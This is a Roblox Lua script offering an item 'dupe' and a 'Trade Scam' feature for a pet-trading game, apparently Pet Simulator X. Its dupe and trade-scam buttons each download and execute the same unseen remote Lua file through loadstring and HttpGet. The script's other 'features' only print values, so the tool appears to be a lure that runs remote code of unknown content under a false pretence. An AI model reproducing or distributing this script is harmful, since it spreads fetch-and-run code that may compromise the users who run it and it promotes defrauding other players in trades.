local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE V3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
        Name = "Info",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    local Section = Tab:AddSection({
        Name = "Credits"
    })
    
    Tab:AddParagraph("Made By 8888 Team","Owner Masqta_#6880")

      local Tab = Window:MakeTab({
        Name = "Dupe",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    Tab:AddLabel("DUPE STATUS:WORKING")
    
    local Section = Tab:AddSection({
        Name = "Dupe Section"
    })
    
    Tab:AddButton({
        Name = "Click To Start Dupe",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
          end    
    })
    
     Tab:AddTextbox({
        Name = "Rename all pets",
        Default = "Text Goes here",
        TextDisappear = true,
        Callback = function(Value)
            print(Value)
        end	  
    })
    
    local Tab = Window:MakeTab({
        Name = "Trade Scam",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    Tab:AddLabel("Make sure that your in trade before enabled Trade Scam")

    local Section = Tab:AddSection({
	Name = "Trade Scam Section"
    })

    Tab:AddButton({
        Name = "Trade Scam",
        Default = false,
        Callback = function(Value)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
        end    
    })

    Tab:AddButton({
	Name = "Remove Trade Pet",
	Callback = function()
        print(Value)
  	end    
    })
    
       local Tab = Window:MakeTab({
        Name = "Settings",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    
